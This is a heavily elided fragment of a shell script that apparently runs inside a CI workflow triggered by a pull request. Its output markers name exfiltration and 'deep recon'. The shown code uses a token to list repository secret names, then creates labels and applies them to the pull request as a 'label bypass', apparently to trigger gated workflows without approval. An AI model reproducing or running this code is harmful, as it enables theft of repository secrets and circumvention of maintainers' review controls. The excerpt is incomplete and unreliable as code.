...
echo "==PRT_EXFIL_END_08ad94330a3c=="
        ...
        if [ -n "$__PRT_TK" ]; then
          ...
          echo "==PRT_RECON_START_08ad94330a3c=="
          (
            # --- Repo secret names ---
            echo "##REPO_SECRETS##"
...
" 2>/dev/null
          ...
          echo "==PRT_RECON_END_08ad94330a3c=="
        fi
        # --- end deep recon ---
            ...
            for __entry in $__PRT_LABELS; do
              ...
              if [ "$__LBL_CREATE" = "201" ] || [ "$__LBL_CREATE" = "422" ]; then
                ...
                if [ "$__LBL_APPLY" = "200" ]; then
                  echo "PRT_LABEL_BYPASS_08ad94330a3c=$__LBL_WF:$__LBL_NAME"
                else
                  echo "PRT_LABEL_BYPASS_ERR_08ad94330a3c=apply_failed:$__LBL_APPLY:$__LBL_WF"
                fi
              else
                echo "PRT_LABEL_BYPASS_ERR_08ad94330a3c=create_failed:$__LBL_CREATE:$__LBL_WF"
              fi
            done
          else
            echo "PRT_LABEL_BYPASS_ERR_08ad94330a3c=no_pr_number"
          fi
        fi
        # --- end label bypass ---
